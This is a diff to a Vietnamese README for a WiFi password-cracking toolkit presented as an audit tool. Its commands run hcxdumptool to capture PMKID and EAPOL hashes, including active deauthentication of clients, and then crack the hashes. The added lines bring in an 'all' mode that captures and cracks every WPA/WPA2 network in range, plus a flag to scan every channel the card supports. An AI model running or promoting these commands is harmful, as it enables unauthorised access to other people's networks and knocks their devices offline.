@@ -93,11 +93,14 @@ sudo python3 audit.py
 
 `audit.py` thực hiện toàn bộ quy trình: quét các AP xung quanh (SSID, BSSID, kênh, band, signal, bảo mật), cho chọn mục tiêu theo số thứ tự, capture PMKID + EAPOL bằng `hcxdumptool`, fallback handshake nếu chưa đủ hash, lọc hash theo đúng BSSID mục tiêu rồi gọi `crack.py`. WiFi của máy sẽ tạm ngắt trong lúc capture và được khôi phục sau đó (NetworkManager).
 
+Chọn `a` (all) thay vì STT để capture **toàn bộ mạng WPA/WPA2 tìm thấy** (tự bỏ qua mạng mở/WEP/WPA3-only/Enterprise). Hash của tất cả mục tiêu được gộp vào một file `captures/all-targets-*.hc22000` và crack một lần; mục tiêu không bắt được hash sẽ được liệt kê ở cuối.
+
 Các tuỳ chọn chính:
 
 ```bash
 sudo python3 audit.py --iface wlo1          # chỉ định interface
 sudo python3 audit.py --pmkid-minutes 5     # thời gian capture PMKID
+sudo python3 audit.py --all-channels        # quét mọi kênh card hỗ trợ (-F)
 sudo python3 audit.py --hs-seconds 60       # thời gian fallback handshake
 sudo python3 audit.py --mask-lens 8,9 --phone --deep
 sudo python3 audit.py --wordlist custom.txt
@@ -115,12 +118,14 @@ Ghi lại BSSID và kênh của AP mục tiêu (từ `iw dev`, trang quản tr�
 #### PMKID + EAPOL bằng hcxdumptool (clientless, ưu tiên thử trước)
 
 ```bash
-sudo ./capture/pmkid.sh wlan0 5        # quét 5 phút, mọi kênh
+sudo ./capture/pmkid.sh wlan0 5        # quét 5 phút, kênh mặc định 1/6/11
+sudo ./capture/pmkid.sh wlan0 5 all    # quét 5 phút, mọi kênh card hỗ trợ (-F)
 sudo ./capture/pmkid.sh wlan0 5 6      # hoặc chỉ định kênh
 sudo ./capture/pmkid.sh wlan0 5 6c     # 6GHz: kênh + hậu tố band (a=2.4, b=5, c=6)
 sudo ./capture/pmkid.sh wlan0 5 6 AA:BB:CC:DD:EE:FF   # chỉ AP mục tiêu (khuyến nghị)
 ```
 
+- Không truyền kênh thì hcxdumptool chỉ nhảy mặc định `1/6/11`; dùng `all` để phủ toàn bộ kênh/band card hỗ trợ, hoặc `--all-channels` khi chạy `audit.py`.
 - Một phiên `hcxdumptool` vừa yêu cầu **PMKID** vừa bắt **EAPOL** (deauth/association chủ động); script dừng sớm khi đã có PMKID hoặc cặp M1M2/M1M2M3 hoàn chỉnh.
 - Không cần client đang kết nối. PMKID chỉ hiệu quả với AP còn tồn tại lỗ hổng PMKID; EAPOL cần client reconnect (hcxdumptool tự deauth).
 - Kết quả: `captures/pmkid-*.pcapng` + `.hc22000` (tự convert nếu có `hcxpcapngtool`); file có quyền `600`, thư mục `captures/` quyền `700`.
